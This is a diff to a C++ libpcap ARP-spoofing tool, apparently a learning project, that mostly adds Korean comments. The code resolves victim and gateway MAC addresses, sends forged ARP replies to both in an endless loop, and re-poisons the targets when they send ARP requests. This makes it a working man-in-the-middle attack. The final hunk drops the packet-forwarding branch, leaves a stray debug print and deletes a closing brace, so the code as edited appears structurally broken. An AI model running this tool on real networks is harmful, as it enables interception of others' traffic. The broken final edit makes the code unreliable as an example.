@@ -25,7 +25,7 @@ struct IPPair {
     std::string targetIP;
 };
 
-// Custom function to get MAC address
+// 네트워크 인터페이스의 MAC 주소를 얻는 함수
 bool getMyMacAddress(const std::string& interface, uint8_t* mac) {
     std::string path = "/sys/class/net/" + interface + "/address";
     std::ifstream macFile(path);
@@ -37,11 +37,13 @@ bool getMyMacAddress(const std::string& interface, uint8_t* mac) {
     std::string macStr;
     macFile >> macStr;
 
-    if (macStr.length() != 17) {  // XX:XX:XX:XX:XX:XX
+    // MAC 주소 형식 검증 (XX:XX:XX:XX:XX:XX)
+    if (macStr.length() != 17) {  
         std::cerr << "Invalid MAC address format" << std::endl;
         return false;
     }
 
+    // 문자열 MAC 주소를 바이트 배열로 변환
     for (int i = 0; i < 6; i++) {
         mac[i] = std::stoi(macStr.substr(i*3, 2), nullptr, 16);
     }
@@ -68,7 +70,7 @@ bool getMyIPAddress(const std::string& interface, char* ip) {
     try {
         std::string result = exec(cmd.c_str());
         if (!result.empty()) {
-            // Remove newline character if present
+            // 결과에서 개행문자 제거
             if (result[result.length()-1] == '\n') {
                 result.erase(result.length()-1);
             }
@@ -83,33 +85,36 @@ bool getMyIPAddress(const std::string& interface, char* ip) {
     return false;
 }
 
+// ARP 패킷 생성 및 전송
 void sendArpPacket(pcap_t* handle, const uint8_t* srcMac, const uint8_t* dstMac, 
                    uint16_t opcode, const uint8_t* senderMac, const char* senderIp, 
                    const uint8_t* targetMac, const char* targetIp) {
     ArpPacket packet;
     
-    // Ethernet header
+    // 이더넷 헤더
     memcpy(packet.eth.ether_dhost, dstMac, 6);
     memcpy(packet.eth.ether_shost, srcMac, 6);
     packet.eth.ether_type = htons(ETHERTYPE_ARP);
     
-    // ARP header
-    packet.arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
-    packet.arp.ea_hdr.ar_pro = htons(ETHERTYPE_IP);
-    packet.arp.ea_hdr.ar_hln = 6;
-    packet.arp.ea_hdr.ar_pln = 4;
-    packet.arp.ea_hdr.ar_op = htons(opcode);
+    // ARP 헤더
+    packet.arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER); // hardware type = Ethernet
+    packet.arp.ea_hdr.ar_pro = htons(ETHERTYPE_IP); // protocol type = IPv4
+    packet.arp.ea_hdr.ar_hln = 6;                   // Mac 주소 길이
+    packet.arp.ea_hdr.ar_pln = 4;                   // Ip 주소 길이
+    packet.arp.ea_hdr.ar_op = htons(opcode);        // ARP Request or ARP Reply
     
     memcpy(packet.arp.arp_sha, senderMac, 6);
-    inet_pton(AF_INET, senderIp, packet.arp.arp_spa);
+    inet_pton(AF_INET, senderIp, packet.arp.arp_spa); // AF_INET = Ipv4, change string(senderIp) to binary(arp_spa)
     memcpy(packet.arp.arp_tha, targetMac, 6);
-    inet_pton(AF_INET, targetIp, packet.arp.arp_tpa);
+    inet_pton(AF_INET, targetIp, packet.arp.arp_tpa); // AF_INET = Ipv4, change string(targetIp) to binary(arp_tpa)
     
-    pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(ArpPacket));
+    pcap_sendpacket(handle, (const u_char*)&packet, sizeof(ArpPacket));
 }
 
+// 지정된 IP 주소의 MAC 주소를 얻는 함수
 void getMacAddress(pcap_t* handle, const uint8_t* srcMac, const char* srcIp, const char* targetIp, uint8_t* macResult) {
     uint8_t broadcastMac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+    // ARP 요청 패킷 전송
     sendArpPacket(handle, srcMac, broadcastMac, ARPOP_REQUEST, srcMac, srcIp, broadcastMac, targetIp);
     
     struct pcap_pkthdr* header;
@@ -128,12 +133,15 @@ void getMacAddress(pcap_t* handle, const uint8_t* srcMac, const char* srcIp, con
     }
 }
 
+// 주기적으로 ARP 스푸핑 패킷을 전송
 void periodicArpSpoof(pcap_t* handle, const uint8_t* attackerMac, const std::vector<IPPair>& ipPairs, 
                       const std::vector<uint8_t*>& senderMacs, const std::vector<uint8_t*>& targetMacs) {
     while (true) {
         for (size_t i = 0; i < ipPairs.size(); ++i) {
+            // sender에게 위조된 ARP 응답 전송
             sendArpPacket(handle, attackerMac, senderMacs[i], ARPOP_REPLY, attackerMac, 
                           ipPairs[i].targetIP.c_str(), senderMacs[i], ipPairs[i].senderIP.c_str());
+            // 게이트웨이에게 위조된 ARP 응답 전송
             sendArpPacket(handle, attackerMac, targetMacs[i], ARPOP_REPLY, attackerMac, 
                           ipPairs[i].senderIP.c_str(), targetMacs[i], ipPairs[i].targetIP.c_str());
         }
@@ -147,6 +155,7 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
+    // pcap 핸들 열기
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
     if (handle == nullptr) {
@@ -181,22 +190,26 @@ int main(int argc, char* argv[]) {
         targetMacs.push_back(targetMac);
     }
 
+    // ARP 스푸핑 스레드 시작
     std::thread spoofThread(periodicArpSpoof, handle, attackerMac, ipPairs, senderMacs, targetMacs);
-
+    
+    // 패킷 캡처 및 처리 루프
     struct pcap_pkthdr* header;
     const u_char* packet;
     while (pcap_next_ex(handle, &header, &packet) >= 0) {
         struct ether_header* ethHeader = (struct ether_header*)packet;
         
+        // 공격자의 MAC 주소로 향하는 패킷 처리
         if (memcmp(ethHeader->ether_dhost, attackerMac, 6) == 0) {
             if (ntohs(ethHeader->ether_type) == ETHERTYPE_ARP) {
                 ArpPacket* arpPacket = (ArpPacket*)packet;
                 if (ntohs(arpPacket->arp.ea_hdr.ar_op) == ARPOP_REQUEST) {
+                    // ARP 요청 패킷 처리
                     char senderIp[INET_ADDRSTRLEN];
                     inet_ntop(AF_INET, arpPacket->arp.arp_spa, senderIp, INET_ADDRSTRLEN);
                     char targetIp[INET_ADDRSTRLEN];
                     inet_ntop(AF_INET, arpPacket->arp.arp_tpa, targetIp, INET_ADDRSTRLEN);
-                    
+                    // 스푸핑 대상인 경우 재감염
                     for (const auto& pair : ipPairs) {
                         if (strcmp(senderIp, pair.senderIP.c_str()) == 0 || strcmp(senderIp, pair.targetIP.c_str()) == 0) {
                             std::cout << "ARP request detected. Re-infecting..." << std::endl;
@@ -206,12 +219,10 @@ int main(int argc, char* argv[]) {
                         }
                     }
                 }
-            } else if (ntohs(ethHeader->ether_type) == ETHERTYPE_IP) {
-                // not yet.....
-                std::cout << "Received IP packet. Forwarding..." << std::endl;
+            }   // not yet.....
+                std::cout << " arp test " << std::endl;
             }
         }
-    }
 
     spoofThread.join();
     pcap_close(handle);
